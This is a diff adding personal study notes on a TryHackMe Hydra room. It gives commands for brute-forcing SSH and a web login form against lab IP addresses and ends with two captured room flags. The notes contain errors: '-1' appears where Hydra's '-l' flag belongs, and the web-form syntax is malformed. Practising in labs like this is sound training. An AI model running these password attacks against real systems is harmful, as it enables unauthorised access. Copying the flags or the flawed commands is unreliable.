@@ -19,3 +19,21 @@ Hydra Commands
 hydra -l user -P passlist.txt ftp://MACHINE_IP
 For this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method).
 SSH
+
+05-22-24
+10.10.193.249
+hydra -1 <username> -P <full path to pass> 10.10.193.249 -t 4 ssh
+-1 specifies the (SSH) username for login
+-P indicates a list of passwords
+-t sets the number of threads to spawn
+
+For example, hydra -1 root -P passwords.txt 10.10.193.249 -t 4 ssh will run with the following arguments:
+Hydra will use root as the username for ssh
+it will try the passwords in the passwords.text file
+there will be four threads running in parallel as indicated by -t 4
+
+POST WEB FORM
+We can use Hydra to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your brower's network tab (in developers tool)
+root@kali:/home/kali/thm/roomshydra# hydra -l molly -P /usr/share/wordlist/rockyou.txt 10.10.0.223 http-post-form " /loginusername:=^USER^&password=^PASS^:Your username or password is inncorrect."
+THM{2673a7dd116de68e85c48ec0b1f2612e}
+THM{c8eebo468febbadea859baeb33b2541b}
